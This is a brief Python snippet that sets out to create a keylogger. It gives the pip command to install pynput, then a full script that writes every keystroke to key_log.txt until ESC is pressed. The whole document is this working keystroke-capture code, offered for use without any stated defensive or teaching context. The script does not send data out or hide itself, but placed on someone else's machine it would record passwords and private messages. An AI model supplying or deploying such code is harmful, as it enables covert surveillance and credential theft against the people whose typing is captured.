##Python code to create the keylogger program
To install the pynput library, you can use pip, which is Python's package installer
command "pip install pynput"

from pynput import keyboard

# File to log the keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
 print("press ESC button to stop logging")
 if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    
